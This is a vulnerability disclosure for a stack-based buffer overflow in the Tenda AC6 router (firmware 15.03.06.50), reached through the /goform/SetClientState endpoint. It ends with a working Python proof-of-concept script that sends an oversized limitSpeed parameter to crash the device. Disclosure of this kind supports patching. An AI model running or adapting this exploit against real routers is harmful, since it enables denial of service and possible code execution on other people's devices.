# Bug Report: Buffer Overflow in Tenda AC6 15.03.06.50 Router
A buffer overflow vulnerability has been identified in the Tenda AC6 15.03.06.50 router firmware that allows remote attackers to potentially execute arbitrary code or cause denial of service through malformed HTTP requests.

## Vulnerability Details

### Product Information
- **Product**: Tenda AC6 Wireless Router
- **Affected Version**: 15.03.06.50
- **Download Source**: https://www.tendacn.com/material/show/103316
- **Vulnerability Type**: Stack-based Buffer Overflow

## Description:
A buffer overflow vulnerability exists in the HTTP request handler for the `/goform/SetClientState` endpoint. The vulnerability is triggered when processing requests containing the following parameters with excessive data lengths: `limitSpeed`/`deviceId`/`limitSpeedUp`.

![alt text](image-2.png)
## poc
![alt text](image.png)
![alt text](image-1.png)


## Reproduce
```python
#!/usr/bin/env python3
from pwn import *
import requests

def send_payload(url, payload):
    print("sending...")
    response = requests.get(url, params={'limitSpeed': payload, 'limitEn': "1"})
    print(f"Response status code: {response.status_code}\nResponse body: {response.text}")

payload = 0x200 * b'1'
payload += b'DOIT' 
send_payload("http://10.10.10.1/goform/SetClientState", payload)
```